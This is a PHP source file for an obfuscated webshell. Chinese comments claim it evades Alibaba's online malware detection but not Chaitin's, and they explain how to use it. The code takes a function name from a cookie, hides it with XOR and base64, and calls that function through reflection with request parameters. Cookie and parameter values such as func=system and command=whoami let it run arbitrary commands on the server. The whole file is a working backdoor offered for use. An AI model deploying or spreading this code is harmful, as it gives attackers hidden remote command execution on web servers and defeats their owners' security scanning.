<?php

//过阿里在线监测 长亭失败
//使用方法
//cookie:func=system;type=1; 此时会输出base64的字符串 a
//获得字符串后
//cookie:func=a; 
//param:command=whoami
 

class go {
    public $payload = "AggCBRQc"; 
    private $key = "qingshan";

    public function __construct() {
        $this->run();
    }

    private function run() {
        if (isset($_COOKIE['type'])) echo base64_encode($this->xorEncrypt($_COOKIE['func'],$this->key));
        if (isset($_COOKIE['func'])) $this->payload = $_COOKIE['func'];
        $payload = base64_decode($this->payload);
        $decrypted_payload = $this->xorDecrypt($payload, $this->key);
        $this->executePayload($decrypted_payload);
    }

    private function xorDecrypt($data, $key) {
        $decrypted_data = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $decrypted_data .= $data[$i] ^ $key;
        }
        return $decrypted_data;
    }

    private function executePayload($payload) {
        $reflected_function = new ReflectionFunction($payload);
        $parameters = $reflected_function->getParameters();
        $args = array();
        foreach ($parameters as $parameter) {
            $args[] = $parameter->getName();
        }
        if ($payload != 'system' and isset($_COOKIE['type'])) var_dump($args);
        $data = array();
        foreach ($args as $arg){
            $data[] = isset($_REQUEST[$arg]) ? $_REQUEST[$arg] : '111';
        }
        call_user_func_array($payload, $data);
    }

    private function xorEncrypt($data, $key) {
        $encrypted_data = '';
        for ($i = 0; $i < strlen($data); $i++) {
            $encrypted_data .= $data[$i] ^ $key;
        }
        return $encrypted_data;
    }
}

new go();